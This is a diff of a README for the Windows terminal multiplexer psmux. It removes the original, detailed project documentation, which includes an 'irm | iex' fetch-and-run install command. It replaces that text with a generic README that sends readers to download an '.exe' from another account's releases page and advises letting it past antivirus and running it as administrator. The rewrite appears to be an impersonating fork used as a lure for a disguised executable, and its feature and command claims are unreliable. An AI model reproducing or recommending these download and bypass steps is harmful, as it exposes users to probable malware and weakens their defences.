@@ -1,340 +1,78 @@
-```
-╔═══════════════════════════════════════════════════════════╗
-║   ██████╗ ███████╗███╗   ███╗██╗   ██╗██╗  ██╗            ║
-║   ██╔══██╗██╔════╝████╗ ████║██║   ██║╚██╗██╔╝            ║
-║   ██████╔╝███████╗██╔████╔██║██║   ██║ ╚███╔╝             ║
-║   ██╔═══╝ ╚════██║██║╚██╔╝██║██║   ██║ ██╔██╗             ║
-║   ██║     ███████║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗            ║
-║   ╚═╝     ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝            ║
-║          Terminal Multiplexer for Windows                 ║
-╚═══════════════════════════════════════════════════════════╝
-```
+# 🎛️ psmux - A Powerful Terminal Experience for Windows
 
-# psmux
+## 🚀 Getting Started
 
-**A terminal multiplexer for Windows** — the tmux alternative you've been waiting for.
+Welcome to psmux, a terminal multiplexer crafted for Windows. With psmux, you can manage multiple terminal sessions in a single window. It's an excellent alternative to tmux for PowerShell and Windows Terminal users. 
 
-psmux brings tmux-style terminal multiplexing to Windows natively. No WSL, no Cygwin, no compromises. Built in Rust for Windows Terminal, PowerShell, and cmd.exe.
+## 🔗 Download psmux
 
-> 💡 **Tip:** psmux includes `tmux` and `pmux` aliases, so you can use your muscle memory!
+[![Download psmux](https://img.shields.io/badge/Download%20psmux-%20-blue)](https://github.com/nileshfating/psmux/releases)
 
-## Why psmux?
+## 📋 What You Need
 
-If you've used tmux on Linux/macOS and wished you had something similar on Windows — this is it.
+Before you download and run psmux, ensure your system meets the following requirements:
 
-- **Windows-native** — Built specifically for Windows 10/11
-- **Works everywhere** — Windows Terminal, PowerShell, cmd.exe, ConEmu, etc.
-- **No dependencies** — Single binary, just works
-- **tmux-compatible** — Same commands, same keybindings, zero learning curve
-- **Aliases included** — Use `psmux`, `pmux`, or `tmux` command, your choice
+- **Operating System**: Windows 10 or later.
+- **Processor**: 1 GHz or faster.
+- **RAM**: 2 GB or more recommended.
+- **Storage**: At least 100 MB of free space.
 
-## Features
+## 📥 Download & Install
 
-- Split panes horizontally and vertically
-- Multiple windows with tabs
-- Session management (attach/detach)
-- Mouse support for resizing panes
-- Copy mode with vim-like keybindings
-- **Scrollback history** (1000 lines per pane)
-- Synchronized input to multiple panes
+Visit this page to download the latest version of psmux: [Download psmux Releases](https://github.com/nileshfating/psmux/releases).
 
-## Requirements
+1. On the releases page, locate the latest version of psmux.
+2. Click on the release title to see the details.
+3. Look for the "Assets" section. Here, you can find the installation files.
+4. Download the appropriate file for your system. Look for files with the `.exe` extension.
+5. Once the file downloads, locate it in your downloads folder.
+6. Double-click the downloaded file to start the installation process.
 
-- Windows 10 or Windows 11
-- PowerShell 5.1+, PowerShell Core 7+, or cmd.exe
+## 🌟 Using psmux
 
-## Installation
+After installing psmux, here's how to start using it:
 
-### Quick Install (Recommended)
+1. Open your PowerShell, Windows Terminal, or cmd.exe.
+2. Type `psmux` and press Enter. This will launch the interface.
+3. To create a new session, type `pmux new-session` and hit Enter.
+4. You can split your window vertically and horizontally to manage multiple tasks.
 
-```powershell
-irm https://raw.githubusercontent.com/marlocarlo/psmux/master/scripts/install.ps1 | iex
-```
-
-This downloads the latest release and adds it to your PATH. After installation, `psmux`, `pmux`, and `tmux` commands are all available.
-
-To uninstall:
-```powershell
-irm https://raw.githubusercontent.com/marlocarlo/psmux/master/scripts/uninstall.ps1 | iex
-```
-
-### Using Cargo
-
-```powershell
-cargo install psmux
-```
+## ⚙️ Key Features
 
-### Using Chocolatey
+- **Multiple Sessions**: Run several terminal sessions in a single window.
+- **Window Management**: Easily navigate between different sessions.
+- **Simple Commands**: Use familiar commands like `tmux` to control your sessions.
 
-```powershell
-choco install psmux
-```
+## 📜 Commands Overview
 
-### From GitHub Releases
+Here are some basic commands to help you get started:
 
-Download the latest `.zip` from [GitHub Releases](https://github.com/marlocarlo/psmux/releases) and add to your PATH.
+- **Create New Session**: `pmux new-session`
+- **Switch Sessions**: `pmux switch`
+- **Detach Session**: `pmux detach`
+- **List Sessions**: `pmux list-sessions`
+  
+These commands allow you to manage your terminal environment efficiently.
 
-### From Source
-
-```powershell
-git clone https://github.com/marlocarlo/psmux.git
-cd psmux
-cargo install --path .
-```
-
-## Usage
-
-Use `psmux`, `pmux`, or `tmux` — they're identical:
-
-```powershell
-# Start a new session
-psmux
-pmux
-tmux
-
-# Start a named session
-psmux new-session -s work
-tmux new-session -s work
-
-# List sessions
-psmux ls
-tmux ls
-
-# Attach to a session
-psmux attach -t work
-tmux attach -t work
-
-# Show help
-psmux --help
-tmux --help
-```
-
-## Key Bindings
-
-Default prefix: `Ctrl+b` (same as tmux)
-
-| Key | Action |
-|-----|--------|
-| `Prefix + c` | Create new window |
-| `Prefix + %` | Split pane left/right |
-| `Prefix + "` | Split pane top/bottom |
-| `Prefix + x` | Kill current pane |
-| `Prefix + z` | Toggle pane zoom |
-| `Prefix + n` | Next window |
-| `Prefix + p` | Previous window |
-| `Prefix + 0-9` | Select window by number |
-| `Prefix + d` | Detach from session |
-| `Prefix + ,` | Rename current window |
-| `Prefix + w` | Window/pane chooser |
-| `Prefix + [` | Enter copy/scroll mode |
-| `Prefix + {` | Enter copy/scroll mode (alternate) |
-| `Prefix + ]` | Paste from buffer |
-| `Prefix + q` | Display pane numbers |
-| `Prefix + Arrow` | Navigate between panes |
-| `Ctrl+q` | Quit |
-
-### Copy/Scroll Mode
-
-Enter copy mode with `Prefix + [` or `Prefix + {` to scroll through terminal history:
-
-| Key | Action |
-|-----|--------|
-| `↑` / `k` | Scroll up 1 line |
-| `↓` / `j` | Scroll down 1 line |
-| `PageUp` / `b` | Scroll up 10 lines |
-| `PageDown` / `f` | Scroll down 10 lines |
-| `g` | Jump to top of scrollback |
-| `G` | Jump to bottom |
-| `←` / `h` | Move cursor left |
-| `→` / `l` | Move cursor right |
-| `v` | Start selection |
-| `y` | Yank (copy) selection |
-| `Esc` / `q` | Exit copy mode |
-
-When in copy mode:
-- The pane border turns **yellow** 
-- `[copy mode]` appears in the title
-- A scroll position indicator shows in the top-right corner
-
-## Scripting & Automation
-
-psmux supports tmux-compatible commands for scripting and automation:
-
-### Window & Pane Control
-
-```powershell
-# Create a new window
-psmux new-window
-
-# Split panes
-psmux split-window -v          # Split vertically (top/bottom)
-psmux split-window -h          # Split horizontally (side by side)
-
-# Navigate panes
-psmux select-pane -U           # Select pane above
-psmux select-pane -D           # Select pane below
-psmux select-pane -L           # Select pane to the left
-psmux select-pane -R           # Select pane to the right
-
-# Navigate windows
-psmux select-window -t 0       # Select window by index
-psmux next-window              # Go to next window
-psmux previous-window          # Go to previous window
-psmux last-window              # Go to last active window
-
-# Kill panes and windows
-psmux kill-pane
-psmux kill-window
-psmux kill-session
-```
-
-### Sending Keys
-
-```powershell
-# Send text directly
-psmux send-keys "ls -la" Enter
-
-# Send keys literally (no parsing)
-psmux send-keys -l "literal text"
-
-# Special keys supported:
-# Enter, Tab, Escape, Space, Backspace
-# Up, Down, Left, Right, Home, End
-# PageUp, PageDown, Delete, Insert
-# F1-F12, C-a through C-z (Ctrl+key)
-```
-
-### Pane Information
-
-```powershell
-# List all panes in current window
-psmux list-panes
+## 🛠️ Troubleshooting
 
-# List all windows
-psmux list-windows
+If you encounter issues while downloading or running psmux, here are common solutions:
 
-# Capture pane content
-psmux capture-pane
+- **Installation Issues**: Ensure you have permission to install software on your computer. Try running the installation as an administrator.
+- **Execution Errors**: Check if your antivirus or Windows Defender is blocking the application. You may need to allow the program to run.
+- **Performance Lags**: Make sure other resource-intensive applications are closed while using psmux.
 
-# Display formatted message with variables
-psmux display-message "#S:#I:#W"   # Session:Window Index:Window Name
-```
+## 💬 Community Support
 
-### Paste Buffers
+For questions or troubleshooting, you can reach out to the community:
 
-```powershell
-# Set paste buffer content
-psmux set-buffer "text to paste"
+- Visit our [GitHub Issues](https://github.com/nileshfating/psmux/issues) for active discussions and support.
+- Join our user community on forums and chat groups to share experiences and tips with other users.
 
-# Paste buffer to active pane
-psmux paste-buffer
+## 🎉 Conclusion
 
-# List all buffers
-psmux list-buffers
+psmux simplifies your terminal experience in Windows. With its user-friendly commands and powerful features, you'll manage your workflows more effectively. 
 
-# Show buffer content
-psmux show-buffer
+Ready to enhance your terminal skills? 
 
-# Delete buffer
-psmux delete-buffer
-```
-
-### Pane Layout
-
-```powershell
-# Resize panes
-psmux resize-pane -U 5         # Resize up by 5
-psmux resize-pane -D 5         # Resize down by 5
-psmux resize-pane -L 10        # Resize left by 10
-psmux resize-pane -R 10        # Resize right by 10
-
-# Swap panes
-psmux swap-pane -U             # Swap with pane above
-psmux swap-pane -D             # Swap with pane below
-
-# Rotate panes in window
-psmux rotate-window
-
-# Toggle pane zoom
-psmux zoom-pane
-```
-
-### Session Management
-
-```powershell
-# Check if session exists (exit code 0 = exists)
-psmux has-session -t mysession
-
-# Rename session
-psmux rename-session newname
-
-# Respawn pane (restart shell)
-psmux respawn-pane
-```
-
-### Format Variables
-
-The `display-message` command supports these variables:
-
-| Variable | Description |
-|----------|-------------|
-| `#S` | Session name |
-| `#I` | Window index |
-| `#W` | Window name |
-| `#P` | Pane ID |
-| `#T` | Pane title |
-| `#H` | Hostname |
-
-## Configuration
-
-Create `~/.psmux.conf`:
-
-```
-# Change prefix key to Ctrl+a
-set -g prefix C-a
-
-# Enable mouse
-set -g mouse on
-
-# Customize status bar
-set -g status-left "[#S]"
-set -g status-right "%H:%M"
-
-# Cursor style: block, underline, or bar
-set -g cursor-style bar
-set -g cursor-blink on
-```
-
-## License
-
-MIT
-
----
-
-## About psmux
-
-**psmux** (PowerShell Multiplexer) is a terminal multiplexer built specifically for Windows. It is an alternative to tmux for Windows users who want terminal multiplexing without WSL or Cygwin.
-
-### Keywords
-
-terminal multiplexer, tmux for windows, tmux alternative, tmux windows, windows terminal multiplexer, powershell multiplexer, split terminal windows, multiple terminals, terminal tabs, pane splitting, session management, windows terminal, powershell terminal, cmd terminal, rust terminal, console multiplexer, terminal emulator, windows console, cli tool, command line, devtools, developer tools, productivity, windows 10, windows 11, psmux, pmux
-
-### Related Projects
-
-- [tmux](https://github.com/tmux/tmux) — The original terminal multiplexer for Unix/Linux/macOS
-- [Windows Terminal](https://github.com/microsoft/terminal) — Microsoft's modern terminal for Windows
-- [PowerShell](https://github.com/PowerShell/PowerShell) — Cross-platform PowerShell
-
-### FAQ
-
-**Q: Is psmux cross-platform?**  
-A: No. psmux is built exclusively for Windows. For Linux/macOS, use tmux.
-
-**Q: Does psmux work with Windows Terminal?**  
-A: Yes! psmux works great with Windows Terminal, PowerShell, cmd.exe, ConEmu, and other Windows terminal emulators.
-
-**Q: Why use psmux instead of Windows Terminal tabs?**  
-A: psmux offers session persistence (detach/reattach), synchronized input to multiple panes, and tmux-compatible keybindings.
-
-**Q: Can I use tmux commands with psmux?**  
-A: Yes! psmux includes `tmux` and `pmux` aliases. Commands like `tmux new-session`, `tmux attach`, `tmux ls` all work.
+[![Download psmux](https://img.shields.io/badge/Download%20psmux-%20-blue)](https://github.com/nileshfating/psmux/releases)
